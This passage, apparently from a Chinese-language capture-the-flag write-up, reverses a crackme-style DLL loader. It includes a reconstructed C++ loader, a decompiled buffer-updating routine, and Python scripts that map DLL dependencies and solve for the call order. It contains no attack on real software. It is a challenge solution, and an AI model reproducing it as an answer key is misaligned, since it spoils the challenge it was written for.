class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run_loader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;--- INFINITY TIMES DLL LOADER ---&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs::<span class="built_in">exists</span>(<span class="string">&quot;dlls&quot;</span>)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[!]: No &#x27;dlls&#x27; dir.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> run_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\n=================================================&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[*] Now already loads &quot;</span> &lt;&lt; loadedDllCache.<span class="built_in">size</span>() &lt;&lt; <span class="string">&quot; DLLs.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; run_count + <span class="number">1</span> &lt;&lt; <span class="string">&quot;# [*] Please input DLL index as 4 nums (eg. 1234) or &#x27;R&#x27; to reset all: &quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::string input;</span><br><span class="line">        <span class="keyword">if</span> (!(std::cin &gt;&gt; input)) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;\n[*] Meet EOF, quitting...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="string">&quot;R&quot;</span> || input == <span class="string">&quot;r&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">// cleanup_resources();</span></span><br><span class="line">            std::<span class="built_in">fill</span>(g_output_buffer, g_output_buffer + <span class="number">40000</span>, <span class="number">0</span>);</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;[*] Global buffer reset complete.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            run_count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::string inputDllIndex = input;</span><br><span class="line">        <span class="keyword">if</span> (inputDllIndex.<span class="built_in">length</span>() != <span class="number">4</span> || !std::<span class="built_in">all_of</span>(inputDllIndex.<span class="built_in">begin</span>(), inputDllIndex.<span class="built_in">end</span>(), ::isdigit)) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;[!]: input format wrong. Must be 4 digits or &#x27;R&#x27;.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            std::cin.<span class="built_in">clear</span>();</span><br><span class="line">            std::cin.<span class="built_in">ignore</span>(std::numeric_limits&lt;std::streamsize&gt;::<span class="built_in">max</span>(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> mainDllIndex = (<span class="type">unsigned</span> <span class="type">short</span>)std::<span class="built_in">stoi</span>(inputDllIndex);</span><br><span class="line">        std::<span class="built_in">fill</span>(g_output_buffer, g_output_buffer + <span class="number">40000</span>, <span class="number">0</span>); </span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[*] Global Output Buffer has been cleared to zero.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        </span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\n[*] Start loading DLL: &quot;</span> &lt;&lt; inputDllIndex &lt;&lt; <span class="string">&quot;.dll...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        LoadedDllInfo* mainDllInfo = <span class="built_in">LoadCustomDll</span>(mainDllIndex);</span><br><span class="line">        <span class="keyword">if</span> (!mainDllInfo) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;\n[!]: Failed to load main DLL: &quot;</span> &lt;&lt; inputDllIndex &lt;&lt; <span class="string">&quot;.dll.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\n[*] ALL DLL are loaded.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">if</span> (!mainDllInfo-&gt;exports.<span class="built_in">count</span>(<span class="string">&quot;_Z5checkPh&quot;</span>)) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;\n[!]: No check function in main DLL.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckFunc checkFunction = (CheckFunc)mainDllInfo-&gt;exports.<span class="built_in">at</span>(<span class="string">&quot;_Z5checkPh&quot;</span>);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;[*] Found _Z5checkPh. Calling checker...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::string hexInput;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\n[*] Please input hex form of 32 bytes (64 chars) as input: &quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cin.<span class="built_in">ignore</span>(std::numeric_limits&lt;std::streamsize&gt;::<span class="built_in">max</span>(), <span class="string">&#x27;\n&#x27;</span>); </span><br><span class="line">        <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, hexInput)) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;\n[*] Meet EOF, quitting...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hexInput.<span class="built_in">erase</span>(std::<span class="built_in">remove_if</span>(hexInput.<span class="built_in">begin</span>(), hexInput.<span class="built_in">end</span>(), ::isspace), hexInput.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> checkData[<span class="number">32</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">hexToBytes</span>(hexInput, checkData)) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;[!]: HEX format wrong.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\n[*] Calling _Z5checkPh(0x&quot;</span> &lt;&lt; hexInput &lt;&lt; <span class="string">&quot;)...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        BOOL checkResult = <span class="built_in">checkFunction</span>(checkData);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;----- Result -----&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Result (BOOL): &quot;</span> &lt;&lt; checkResult &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">if</span> (checkResult != <span class="number">0</span>) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Result: Correct (True)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Result: Wrong (False)&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        run_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">SetConsoleOutputCP</span>(CP_UTF8);</span><br><span class="line">    std::ios_base::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">run_loader</span>();</span><br><span class="line">    <span class="built_in">cleanup_resources</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\nPress Enter to quit...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::cin.<span class="built_in">clear</span>();</span><br><span class="line">    std::cin.<span class="built_in">ignore</span>(std::numeric_limits&lt;std::streamsize&gt;::<span class="built_in">max</span>(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    std::cin.<span class="built_in">get</span>(); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意到，源程序中<font color=violet><strong>LOAD_DLL</strong></font>在尾部的调用<code>v30 = ((__int64 (__fastcall *)(_DWORD *, __int64, _QWORD))v31)(Output, 1, 0);</code>其实调用了<font color=lime><strong>DLLEntryPoint</strong></font>，<code>HINSTANCE hinstDLL</code>传入的是<font color=red><strong>Output Buffer</strong></font>的地址，而非正常值，分析<font color=lime><strong>DLLmain</strong></font>函数，发现其在初始化时将内部的一个指针指向了Output Buffer，而<font color=red><strong>Output Buffer</strong></font>的修改机制来源于以下函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">free_obj</span><span class="params">(__int64 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  idx = index;</span><br><span class="line">  v5 = &amp;off_7FF75A602C80;</span><br><span class="line">  v3 = <span class="built_in">sub_7FF75A59F780</span>((__int64)&amp;off_7FF75A602C80);</span><br><span class="line">  v2 = <span class="built_in">sub_7FF75A59F750</span>((__int64)&amp;off_7FF75A602C80);</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">sub_7FF75A511500</span>((__int64)&amp;v3, (__int64)&amp;v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(<span class="type">unsigned</span> __int16 **)<span class="built_in">sub_7FF75A5130F0</span>((__int64)&amp;v3);</span><br><span class="line">    Output[*v4] += idx;</span><br><span class="line">    <span class="built_in">VirtualFree</span>(*((LPVOID *)v4 + <span class="number">1</span>), <span class="number">0</span>, <span class="number">0x8000u</span>);</span><br><span class="line">    <span class="built_in">sub_7FF75A510560</span>(&amp;v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_7FF75A59F7B0</span>(&amp;off_7FF75A602C80);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数会释放之前递归加载的dll链，同时如果有dll被释放，那么Output中该dll的索引处的值就会被加上当前所处的外层大循环的轮数，最终累加得到target，先写脚本提取直接调用：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">DLLS_DIR = <span class="string">&quot;dlls&quot;</span></span><br><span class="line">DB_PATH = <span class="string">&quot;dll_relations.db&quot;</span></span><br><span class="line">TOTAL_IDS = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line">DIGIT4_PATTERN = re.<span class="built_in">compile</span>(<span class="string">rb&#x27;^[0-9]&#123;4&#125;$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_related_ids_in_dll</span>(<span class="params">dll_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dll_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    <span class="keyword">except</span> (OSError, IOError) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] Failed to read <span class="subst">&#123;dll_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">    related = []</span><br><span class="line">    pos = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        idx = data.rfind(<span class="string">b&#x27;.dll&#x27;</span>, <span class="number">0</span>, pos)</span><br><span class="line">        <span class="keyword">if</span> idx == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> idx &lt; <span class="number">4</span>:</span><br><span class="line">            pos = idx</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        prefix = data[idx - <span class="number">4</span>:idx]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> DIGIT4_PATTERN.<span class="keyword">match</span>(prefix):</span><br><span class="line">            id_str = prefix.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">            related.append(id_str)</span><br><span class="line">            pos = idx</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> related</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(DLLS_DIR):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] Directory &#x27;<span class="subst">&#123;DLLS_DIR&#125;</span>&#x27; does not exist.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(DB_PATH)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS relations (</span></span><br><span class="line"><span class="string">            id TEXT PRIMARY KEY,</span></span><br><span class="line"><span class="string">            related_ids TEXT NOT NULL</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    records = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(TOTAL_IDS):</span><br><span class="line">        id_str = <span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>&quot;</span></span><br><span class="line">        dll_path = os.path.join(DLLS_DIR, <span class="string">f&quot;<span class="subst">&#123;id_str&#125;</span>.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(dll_path):</span><br><span class="line">            related = find_related_ids_in_dll(dll_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            related = []</span><br><span class="line">        related_json = json.dumps(related, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">        records.append((id_str, related_json))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[INFO] Processed <span class="subst">&#123;i&#125;</span>/10000&quot;</span>)</span><br><span class="line">    cursor.executemany(<span class="string">&#x27;INSERT OR REPLACE INTO relations (id, related_ids) VALUES (?, ?)&#x27;</span>, records)</span><br><span class="line">    conn.commit()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DONE] Wrote <span class="subst">&#123;<span class="built_in">len</span>(records)&#125;</span> entries to <span class="subst">&#123;DB_PATH&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>然后递归生成调用集合：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line">INPUT_DB = <span class="string">&quot;dll_relations.db&quot;</span></span><br><span class="line">OUTPUT_DB = <span class="string">&quot;dll_closure.db&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_relations</span>(<span class="params">conn</span>):</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT id, related_ids FROM relations&quot;</span>)</span><br><span class="line">    relations = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> id_str, related_json <span class="keyword">in</span> cursor.fetchall():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            related_list = json.loads(related_json)</span><br><span class="line">            relations[id_str] = <span class="built_in">set</span>(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> related_list <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">and</span> <span class="built_in">len</span>(x) == <span class="number">4</span> <span class="keyword">and</span> x.isdigit())</span><br><span class="line">        <span class="keyword">except</span> (json.JSONDecodeError, TypeError):</span><br><span class="line">            relations[id_str] = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">return</span> relations</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_closure</span>(<span class="params">start_id, graph</span>):</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    queue = deque([start_id])</span><br><span class="line">    visited.add(start_id)</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        current = queue.popleft()</span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> graph.get(current, <span class="built_in">set</span>()):</span><br><span class="line">            <span class="keyword">if</span> neighbor <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                visited.add(neighbor)</span><br><span class="line">                queue.append(neighbor)</span><br><span class="line">    <span class="keyword">return</span> visited</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(INPUT_DB) <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[INFO] Loading relations from <span class="subst">&#123;INPUT_DB&#125;</span>...&quot;</span>)</span><br><span class="line">        graph = load_relations(conn)</span><br><span class="line">    all_ids = &#123;<span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>)&#125;</span><br><span class="line">    <span class="keyword">for</span> id_str <span class="keyword">in</span> all_ids:</span><br><span class="line">        <span class="keyword">if</span> id_str <span class="keyword">not</span> <span class="keyword">in</span> graph:</span><br><span class="line">            graph[id_str] = <span class="built_in">set</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[INFO] Loaded <span class="subst">&#123;<span class="built_in">len</span>(graph)&#125;</span> nodes. Computing transitive closure...&quot;</span>)</span><br><span class="line">    closures = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i, id_str <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">sorted</span>(all_ids)):</span><br><span class="line">        closure_set = compute_closure(id_str, graph)</span><br><span class="line">        closures[id_str] = <span class="built_in">sorted</span>(closure_set)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">500</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[INFO] Processed <span class="subst">&#123;i&#125;</span>/10000&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(OUTPUT_DB) <span class="keyword">as</span> conn:</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS closure (</span></span><br><span class="line"><span class="string">                id TEXT PRIMARY KEY,</span></span><br><span class="line"><span class="string">                all_deps TEXT NOT NULL</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        conn.commit()</span><br><span class="line">        records = [</span><br><span class="line">            (id_str, json.dumps(deps, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">            <span class="keyword">for</span> id_str, deps <span class="keyword">in</span> closures.items()</span><br><span class="line">        ]</span><br><span class="line">        cursor.executemany(<span class="string">&#x27;INSERT OR REPLACE INTO closure (id, all_deps) VALUES (?, ?)&#x27;</span>, records)</span><br><span class="line">        conn.commit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DONE] Wrote closure data to <span class="subst">&#123;OUTPUT_DB&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>接下来提取target的值并解矩阵得到主dll的调用顺序：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&quot;dll_closure.db&quot;</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(<span class="string">&quot;SELECT id, all_deps FROM closure&quot;</span>)</span><br><span class="line">closure_by_id = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> id_str, deps_json <span class="keyword">in</span> cursor.fetchall():</span><br><span class="line">    deps = <span class="built_in">set</span>(<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> json.loads(deps_json) <span class="keyword">if</span> <span class="built_in">str</span>(x).isdigit() <span class="keyword">and</span> <span class="number">0</span> &lt;= <span class="built_in">int</span>(x) &lt;= <span class="number">9999</span>)</span><br><span class="line">    closure_by_id[<span class="built_in">int</span>(id_str)] = deps</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> closure_by_id:</span><br><span class="line">        closure_by_id[i] = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;target.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(f.read().split())</span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">T = [<span class="built_in">int</span>.from_bytes(data[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>)]</span><br><span class="line"></span><br><span class="line">S = [<span class="built_in">set</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>)]</span><br><span class="line"><span class="keyword">for</span> id_val <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> closure_by_id[id_val]:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= j &lt; <span class="number">10000</span>: S[j].add(id_val)</span><br><span class="line"></span><br><span class="line">p = [-<span class="number">1</span>] * <span class="number">10000</span></span><br><span class="line">remaining_T = T[:]</span><br><span class="line">known = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span 